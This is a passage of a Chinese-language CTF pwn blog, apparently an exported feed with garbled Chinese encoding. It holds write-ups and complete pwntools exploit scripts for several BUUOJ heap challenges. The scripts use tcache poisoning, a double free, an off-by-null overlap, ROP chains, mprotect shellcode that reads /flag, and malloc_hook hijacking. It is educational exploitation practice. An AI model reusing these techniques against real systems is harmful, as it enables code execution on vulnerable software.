åœ¨bssæ®µä¸Šè¯»å–ä¸€ä¸ªæ–°çš„rop chainï¼Œæ¥ç€ret ä¸Šå»æ‰§è¡Œã€‚æ–°çš„rop chainï¼Œå¯ä»¥ä¸ºmprotectè§£å¼€bssæ®µçš„æ‰§è¡Œæƒé™ï¼Œæ¥ç€è·³ä¸Šorw flagçš„shellcodeå³å¯ã€‚ï¼ˆ<strong>mprotect éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚ è¿™é‡Œç›´æ¥è®¾ç½®ä¸ºbssèµ·å§‹åœ°å€å³å¯ã€‚</strong>ï¼‰</p><h4 id="openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ"><a href="#openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ" class="headerlink" title="openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ"></a>openè¢«ç¦ç”¨äº†æ€ä¹ˆåŠ</h4><p>å¯ä»¥ä½¿ç”¨openatè¿›è¡Œä»£æ›¿ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, <span class="hljs-keyword">mode_t</span> mode)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag,  <span class="hljs-keyword">mode_t</span> mode )</span></span>;        <span class="hljs-comment">//å‡½æ•°æ‰§è¡ŒæˆåŠŸè¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼Œå¤±è´¥è¿”å›-1.</span></code></pre></div><p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p><p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p><p>å…¶ä¸­é‡ç‚¹å°±æ˜¯ï¼Œå½“openatçš„pathå‚æ•°ï¼Œè¾“å…¥æ˜¯ç»å¯¹åœ°å€æ—¶ï¼Œfdå°±ä¼šè¢«æ— è§†ï¼Œå…¶å‡½æ•°å°±ç›¸å½“äºopenäº†ã€‚æ‰€ä»¥æ­¤å¤„çš„fdï¼Œä¹Ÿæ˜¯å¯ä»¥è®¾æˆä»»æ„å€¼ã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25080</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))        sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))bss = <span class="hljs-number">0x6021C0</span>pop_rdi = <span class="hljs-number">0x0000000000401193</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000401191</span>pop_rsp_r13_r14_r15 = <span class="hljs-number">0x000000000040118d</span>orw = flat([pop_rdi,<span class="hljs-number">0</span>,pop_rsi_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,elf.plt[<span class="hljs-string">'read'</span>],pop_rsp_r13_r14_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])sa(<span class="hljs-string">'name'</span>,str(orw))<span class="hljs-comment"># sa('name','chumen77'*10)</span>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'2'</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'3'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'4'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'5'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">2</span>)malloc_hook = <span class="hljs-number">0x3c4afd</span> + libcbaseadd(<span class="hljs-number">0x68</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'7'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'8'</span>)rsp_add_0x38 = libc.search(asm(<span class="hljs-string">"add rsp , 0x38\nret"</span>)).next()data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(rsp_add_0x38 + libcbase)<span class="hljs-comment"># data = 3 * '\x00' + p64(0xdeadbeef)</span>add(<span class="hljs-number">0x68</span>,data)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'20'</span>)sleep(<span class="hljs-number">0.2</span>)pop_rdx = libcbase + libc.search(asm(<span class="hljs-string">"pop rdx\nret"</span>)).next()pop_rsp = libcbase + libc.search(asm(<span class="hljs-string">"pop rsp\nret"</span>)).next()mprotect = libcbase + libc.sym[<span class="hljs-string">'mprotect'</span>]payload = flat([pop_rdi,<span class="hljs-number">0x00602000</span>,pop_rsi_r15,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">7</span>,mprotect,<span class="hljs-number">0x602628</span>])shellcode = shellcraft.linux.openat(<span class="hljs-number">0</span>,<span class="hljs-string">'/flag'</span>,<span class="hljs-number">0</span>) + shellcraft.linux.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>) + shellcraft.linux.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)sleep(<span class="hljs-number">0.2</span>)s(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + payload + p64(<span class="hljs-number">0</span>) + asm(shellcode))<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="å»¶ä¼¸åšæ³•"><a href="#å»¶ä¼¸åšæ³•" class="headerlink" title="å»¶ä¼¸åšæ³•"></a>å»¶ä¼¸åšæ³•</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p><p>å…¶æ˜¯ç”¨<code>house_of_orange+setcontext+0x35</code>è°ƒç”¨readä¼ å…¥ropchainæ¥å®Œæˆæ”»å‡»ã€‚</p><p>å¦‚æœæ— æ³•æ§åˆ¶<code>free_hook</code>ä¸”åœ¨libc-2.23æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠæ³•ã€‚</p><h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>ä¸å¯æŒ‡å®šidxï¼Œæ¥æ“ä½œchunkï¼Œåªèƒ½æ“ä½œå½“å‰malloc åˆ†é…chunkå¯¹åº”çš„heapåœ°å€</li><li>åªæœ‰free å’Œ addï¼Œfreeå¯ä»¥4æ¬¡ï¼Œaddå¯ä»¥<code>0xf</code>æ¬¡</li></ul><h3 id="éš¾ç‚¹-2"><a href="#éš¾ç‚¹-2" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><ul><li>æ— showå‡½æ•°</li><li>æœ‰é™çš„freeæ¬¡æ•°ï¼Œåªèƒ½é€šè¿‡åˆé€‚çš„å †æŠ€å·§æˆ–è€…çˆ†ç ´æ¥å®Œæˆæ”»å‡»</li></ul><p>æ­¤é¢˜ç”±äºåªèƒ½4æ¬¡freeï¼Œå…¶ä¸­3æ¬¡freeè¿˜æ˜¯ç›´æ¥å¿…é¡»æ‰§è¡Œçš„ï¼Œåªå‰©ä¸‹çš„ä¸€æ¬¡å°±å°¤ä¸ºå…³é”®ã€‚ç›®æ ‡å°±æ˜¯åœ¨å…¶freeä»¥åï¼Œæœ‰åŠæ³•è®©å†æ¬¡ç”³è¯·çš„chunkå¯ä»¥ä¿®æ”¹åˆ°è¿™ä¸ªfree chunkå¯¹åº”tcache binçš„fdï¼Œæ¥è¿›è¡Œtcache attackã€‚</p><p>å½“ä¸€ä¸ªå †AåŒæ—¶åœ¨tcacheé‡Œé¢ï¼Œåˆåœ¨unsortbiné‡Œé¢ï¼Œè¿™ç§æƒ…å†µæ˜¯å¸¸è§çš„ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å±é™©çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p><p>å½“å…ˆç”³è¯·ä¸€ä¸ªå°çš„chunk Cï¼Œå…¶è‚¯å®šæ˜¯åœ¨æ­¤chunkä¸ŠæŒ‰ç…§unsortbinçš„è§„åˆ™ï¼Œåˆ†å‰²ä¸€ä¸‹ï¼Œç•™ä¸‹ä¸€ä¸ªå°çš„unsortbin binã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæ¥ç€ç”³è¯·ä¸€ä¸ªç›¸åŒäºchunk Aå¤§å°çš„å †ï¼Œå°±æœ‰æœºä¼šæ”¹åˆ°è¿™ä¸ª2ä¸ªè¢«åˆ†å‰²å®Œçš„å°chunkã€‚<strong>æ¯”å¦‚æ”¹0x61çš„unsortbinçš„ä¿¡æ¯ï¼Œå¯ä»¥æ”¹å…¶sizeï¼Œå¹¶ä¸”æå‰åœ¨chunk Bå¤„ä¼ªé€ å¥½æ•°æ®ï¼Œå³å¯å®Œæˆä¸€ä¸ªfake çš„ unsortbinã€‚</strong></p><p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p><p>å€˜è‹¥å†ç”³è¯·ä¸€ä¸ªåˆé€‚çš„å¤§å°ï¼Œæ¯”å¦‚0x68ï¼Œå³å¯æ”¹åˆ°chunk Bçš„æ•°æ®ã€‚æ­¤é¢˜ä¹Ÿå°±æ˜¯æ”¹å…¶fdæŒ‡é’ˆï¼Œå³å¯æ¥ç€å®Œæˆtcache attackã€‚</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_one_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)    free()    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    <span class="hljs-comment">#å¤¹åœ¨top chunkå‰é¢ï¼Œé˜²æ­¢è¿›å…¥unsortbinæ—¶ç›´æ¥åˆå¹¶ã€‚å¹¶ä¸”fakeä¸€äº›æ•°æ®ï¼Œç•™ç€ç»•è¿‡åé¢çš„æ£€æŸ¥ã€‚</span>    add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x20</span>))    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    free()    add(<span class="hljs-number">0x28</span>,p16(<span class="hljs-number">0x9750</span>) + <span class="hljs-string">'\n'</span>)    debug()    <span class="hljs-comment"># ä¿®æ”¹å‰©ä¸‹0x60å¤§å°çš„unsortbinçš„å¤§å°ä¸º0x90ï¼Œä¸”å‰é¢å·²ç»æœ‰fakeçš„æ•°æ®ï¼Œä¸ä¼šè®©ç¨‹åºcrush</span>    add(<span class="hljs-number">0x7f</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x91</span>) +<span class="hljs-string">'\n'</span>)    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x7f</span>,payload + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./sctf_2019_one_heap'</span>)        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x41</span>) + p64(malloc_hook<span class="hljs-number">-8</span>)debug()<span class="hljs-comment"># ä¿®æ”¹0x40 tcache binçš„chain</span>add(<span class="hljs-number">0x68</span>,payload)debug()add(<span class="hljs-number">0x38</span>,<span class="hljs-string">'\n'</span>)realloc=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>] + roc[<span class="hljs-number">1</span>]one = <span class="hljs-number">0x10a38c</span> + libc_basepayload = p64(one) + p64(realloc)add(<span class="hljs-number">0x38</span>,payload + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-es-4"><a href="#ciscn-2019-es-4" class="headerlink" title="ciscn_2019_es_4"></a><code>ciscn_2019_es_4</code></h2><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åˆ©ç”¨off by nullï¼Œæ„é€ chunk overlappingï¼Œç„¶åtcache attackå³å¯ã€‚</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26094</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xa0</span>+p64(<span class="hljs-number">0x1e0</span>))free(<span class="hljs-number">3</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x00000000006022B0</span>))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)*<span class="hljs-number">2</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)show(<span class="hljs-number">6</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebc0a</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0x3ed8e8</span>+libcbase))add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0xa0</span>,p64(libcbase+rce18[<span class="hljs-number">1</span>]))free(<span class="hljs-number">8</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp</title>
    <link href="/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp"><a href="#ciscn-2020-åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp" class="headerlink" title="ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp"></a>ciscn  2020 åä¸­åˆ†åŒºèµ›éƒ¨åˆ†wp</h1><p>ç¬¬ä¸€å¤©è·Ÿ6çº§å†²çªäº†ï¼ŒåŸºæœ¬æ²¡ç©ï¼Œç¬¬äºŒå¤©åšå®Œä¸€ä¸ªé¢˜idaç‚¸äº†ï¼Œæ€ä¹ˆä¹Ÿæ‰“ä¸å¼€ã€‚æœ€è¿‘ï¼Œæ€»æ˜¯å…³é”®æ—¶åˆ»æ‰é“¾å­äº†ğŸ˜­ã€‚</p><h2 id="logic-mistake"><a href="#logic-mistake" class="headerlink" title="logic_mistake"></a><code>logic_mistake</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¯ä»¥ç”³è¯·16ä¸ªå †ï¼Œsizeä¿¡æ¯æ”¾åœ¨å…¶chunkåœ°å€çš„ä¸‹8ä¸ªå­—èŠ‚</li><li>é€šè¿‡strdupæ¥è¿›è¡Œç”³è¯·å †ï¼Œ <code>strdup</code> ç›¸å½“äº<code>s = input() malloc(stren(s))</code> </li></ul><h4 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h4><ul><li><code>read(0, *((void **)&amp;unk_202060 + 2 